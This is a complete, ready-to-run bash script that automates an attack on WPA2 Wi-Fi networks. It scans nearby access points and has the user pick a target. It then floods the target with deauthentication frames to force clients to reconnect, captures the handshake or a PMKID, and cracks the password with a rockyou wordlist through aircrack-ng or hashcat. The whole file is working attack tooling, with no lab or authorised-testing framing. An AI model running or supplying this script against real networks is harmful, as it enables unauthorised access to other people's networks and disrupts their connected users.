#!/bin/bash
# crack.sh — automated WPA2 handshake capture + crack
# usage: sudo bash crack.sh
#
# what it does:
#   1. puts alfa adapter into monitor mode
#   2. scans for nearby networks
#   3. you pick a target
#   4. captures WPA2 handshake (deauths a client to force it)
#   5. cracks with rockyou.txt (aircrack) or hashcat if GPU available
#
# requirements: run setup.sh first, alfa adapter plugged in

set -e

# ─── config ───────────────────────────────────────────────────────
SCAN_TIME=15          # seconds to scan for networks
DEAUTH_PACKETS=10     # number of deauth frames to send
CAPTURE_TIMEOUT=60    # seconds to wait for handshake
WORDLIST="$(dirname "$0")/wordlists/rockyou.txt"
CAPTURE_DIR="$(dirname "$0")/captures"
# ──────────────────────────────────────────────────────────────────

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log()  { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
err()  { echo -e "${RED}[✗]${NC} $1"; }
info() { echo -e "${CYAN}[*]${NC} $1"; }

cleanup() {
    if [ -n "$MON_IFACE" ]; then
        info "restoring interface..."
        airmon-ng stop "$MON_IFACE" &>/dev/null || true
    fi
    # restart network manager
    systemctl start NetworkManager &>/dev/null || service network-manager start &>/dev/null || true
}
trap cleanup EXIT

# ─── preflight ────────────────────────────────────────────────────
if [ "$EUID" -ne 0 ]; then
    err "run with sudo: sudo bash crack.sh"
    exit 1
fi

if [ ! -f "$WORDLIST" ]; then
    warn "wordlist not found at $WORDLIST"
    info "downloading rockyou.txt (~15MB)..."
    mkdir -p "$(dirname "$WORDLIST")"
    wget -q --show-progress -O "$WORDLIST" \
        "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" \
        || curl -L -o "$WORDLIST" \
        "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
    if [ ! -f "$WORDLIST" ]; then
        err "failed to download wordlist. grab it manually and drop it at $WORDLIST"
        exit 1
    fi
    log "wordlist downloaded."
fi

# ─── find wireless interface ─────────────────────────────────────
info "looking for wireless interfaces..."
IFACES=$(iw dev | awk '$1=="Interface"{print $2}')

if [ -z "$IFACES" ]; then
    err "no wireless interfaces found. is the alfa plugged in?"
    exit 1
fi

echo ""
echo "available interfaces:"
i=1
declare -a IFACE_ARR
for iface in $IFACES; do
    driver=$(ethtool -i "$iface" 2>/dev/null | grep driver | awk '{print $2}')
    echo "  [$i] $iface ($driver)"
    IFACE_ARR+=("$iface")
    ((i++))
done

echo ""
read -p "select interface [1]: " IFACE_CHOICE
IFACE_CHOICE=${IFACE_CHOICE:-1}
IFACE="${IFACE_ARR[$((IFACE_CHOICE-1))]}"
log "using interface: $IFACE"

# ─── kill interfering processes ───────────────────────────────────
info "killing interfering processes..."
airmon-ng check kill &>/dev/null

# ─── monitor mode ─────────────────────────────────────────────────
info "enabling monitor mode on $IFACE..."
airmon-ng start "$IFACE" &>/dev/null

# figure out monitor interface name (could be wlan0mon, wlan1mon, etc.)
MON_IFACE=$(iw dev | awk '$1=="Interface"{print $2}' | grep -i mon | head -1)
if [ -z "$MON_IFACE" ]; then
    # some drivers just keep the same name in monitor mode
    MON_IFACE="$IFACE"
fi
log "monitor interface: $MON_IFACE"

# ─── scan ─────────────────────────────────────────────────────────
SCAN_FILE=$(mktemp /tmp/wifiscan.XXXXXX)
info "scanning for ${SCAN_TIME}s... (ctrl+c won't kill the script)"

timeout "$SCAN_TIME" airodump-ng --output-format csv -w "$SCAN_FILE" "$MON_IFACE" &>/dev/null || true

# parse the csv
SCAN_CSV="${SCAN_FILE}-01.csv"
if [ ! -f "$SCAN_CSV" ]; then
    err "scan failed — no output. check adapter supports monitor mode"
    exit 1
fi

echo ""
echo "┌──────────────────────────────────────────────────────────────────┐"
echo "│  #   BSSID              CH   PWR   ENC        ESSID             │"
echo "├──────────────────────────────────────────────────────────────────┤"

declare -a AP_BSSID
declare -a AP_CHANNEL
declare -a AP_ESSID
idx=1

# parse APs from csv (skip header, stop at client section)
while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_len essid key; do
    # skip headers and empty lines
    [[ "$bssid" =~ ^BSSID ]] && continue
    [[ "$bssid" =~ ^Station ]] && break
    [[ -z "$bssid" ]] && continue

    bssid=$(echo "$bssid" | xargs)
    channel=$(echo "$channel" | xargs)
    power=$(echo "$power" | xargs)
    privacy=$(echo "$privacy" | xargs)
    essid=$(echo "$essid" | xargs)

    [[ -z "$bssid" || "$bssid" == "BSSID" ]] && continue
    [[ -z "$essid" ]] && essid="<hidden>"

    printf "│ %2d   %-18s %-4s %-5s %-10s %-20s│\n" "$idx" "$bssid" "$channel" "$power" "$privacy" "$essid"

    AP_BSSID+=("$bssid")
    AP_CHANNEL+=("$channel")
    AP_ESSID+=("$essid")
    ((idx++))
done < "$SCAN_CSV"

echo "└──────────────────────────────────────────────────────────────────┘"
echo ""

if [ ${#AP_BSSID[@]} -eq 0 ]; then
    err "no networks found. try moving the adapter or increasing SCAN_TIME"
    exit 1
fi

read -p "select target [1]: " TARGET_CHOICE
TARGET_CHOICE=${TARGET_CHOICE:-1}
TARGET_BSSID="${AP_BSSID[$((TARGET_CHOICE-1))]}"
TARGET_CH="${AP_CHANNEL[$((TARGET_CHOICE-1))]}"
TARGET_ESSID="${AP_ESSID[$((TARGET_CHOICE-1))]}"

log "target: $TARGET_ESSID ($TARGET_BSSID) on channel $TARGET_CH"

# ─── capture handshake ────────────────────────────────────────────
CAPTURE_PREFIX="$CAPTURE_DIR/$(echo "$TARGET_ESSID" | tr ' ' '_')_$(date +%s)"
mkdir -p "$CAPTURE_DIR"

info "capturing on channel $TARGET_CH... waiting for handshake"
info "sending $DEAUTH_PACKETS deauth packets to force reconnect"

# start capture in background
airodump-ng -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "$CAPTURE_PREFIX" "$MON_IFACE" &>/dev/null &
AIRODUMP_PID=$!

sleep 3

# deauth to force handshake
aireplay-ng -0 "$DEAUTH_PACKETS" -a "$TARGET_BSSID" "$MON_IFACE" &>/dev/null &

# wait for handshake
HANDSHAKE_FOUND=0
ELAPSED=0
while [ $ELAPSED -lt $CAPTURE_TIMEOUT ]; do
    if aircrack-ng "${CAPTURE_PREFIX}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
        HANDSHAKE_FOUND=1
        break
    fi
    sleep 2
    ((ELAPSED+=2))
    printf "\r${CYAN}[*]${NC} waiting for handshake... ${ELAPSED}s/${CAPTURE_TIMEOUT}s"
done
echo ""

kill $AIRODUMP_PID &>/dev/null || true
wait $AIRODUMP_PID 2>/dev/null || true

if [ $HANDSHAKE_FOUND -eq 0 ]; then
    warn "no handshake captured in ${CAPTURE_TIMEOUT}s"
    warn "possible reasons:"
    warn "  - no clients connected to the AP (nobody to deauth)"
    warn "  - AP is out of range for injection"
    warn "  - AP uses WPA3/SAE (resistant to this attack)"
    echo ""
    warn "try: increase CAPTURE_TIMEOUT, move closer, or wait for a client to connect"

    # try PMKID as fallback
    info "attempting PMKID capture as fallback..."
    PMKID_FILE="$CAPTURE_DIR/pmkid_$(date +%s).pcapng"
    timeout 30 hcxdumptool -i "$MON_IFACE" -o "$PMKID_FILE" --enable_status=1 &>/dev/null || true

    if [ -f "$PMKID_FILE" ] && [ -s "$PMKID_FILE" ]; then
        HASH_FILE="${PMKID_FILE%.pcapng}.22000"
        hcxpcapngtool -o "$HASH_FILE" "$PMKID_FILE" 2>/dev/null

        if [ -f "$HASH_FILE" ] && [ -s "$HASH_FILE" ]; then
            log "got PMKID hash! cracking..."

            if command -v hashcat &>/dev/null && hashcat -I 2>/dev/null | grep -q "Device"; then
                hashcat -m 22000 "$HASH_FILE" "$WORDLIST" --force -o "${HASH_FILE}.cracked" 2>/dev/null
            else
                # fall back to aircrack on the pcap
                warn "no GPU for hashcat, this will be slow with aircrack..."
                aircrack-ng -w "$WORDLIST" "$PMKID_FILE" 2>/dev/null
            fi
        else
            err "no PMKID obtained either. AP may not be vulnerable"
            exit 1
        fi
    else
        err "PMKID capture failed"
        exit 1
    fi
else
    log "handshake captured!"
    CAP_FILE="${CAPTURE_PREFIX}-01.cap"

    # ─── crack ────────────────────────────────────────────────────
    info "cracking with wordlist: $WORDLIST"
    echo ""

    # prefer hashcat with GPU if available
    if command -v hashcat &>/dev/null; then
        HASH_FILE="${CAP_FILE%.cap}.22000"
        hcxpcapngtool -o "$HASH_FILE" "$CAP_FILE" 2>/dev/null || true

        if [ -f "$HASH_FILE" ] && [ -s "$HASH_FILE" ]; then
            info "using hashcat (GPU accelerated)..."
            hashcat -m 22000 "$HASH_FILE" "$WORDLIST" --force -o "${HASH_FILE}.cracked"

            if [ -f "${HASH_FILE}.cracked" ]; then
                echo ""
                CRACKED_PASS=$(cut -d: -f4 "${HASH_FILE}.cracked" | head -1)
                echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                echo -e "  ${GREEN}PASSWORD FOUND:${NC} $CRACKED_PASS"
                echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            else
                warn "password not in wordlist"
            fi
        else
            # fallback to aircrack
            info "hashcat conversion failed, falling back to aircrack..."
            RESULT=$(aircrack-ng -w "$WORDLIST" -b "$TARGET_BSSID" "$CAP_FILE" 2>/dev/null)
            echo "$RESULT" | grep -i "key found"
        fi
    else
        info "using aircrack-ng (CPU only, slower)..."
        aircrack-ng -w "$WORDLIST" -b "$TARGET_BSSID" "$CAP_FILE"
    fi
fi

echo ""
log "capture files saved in: $CAPTURE_DIR/"
log "done."
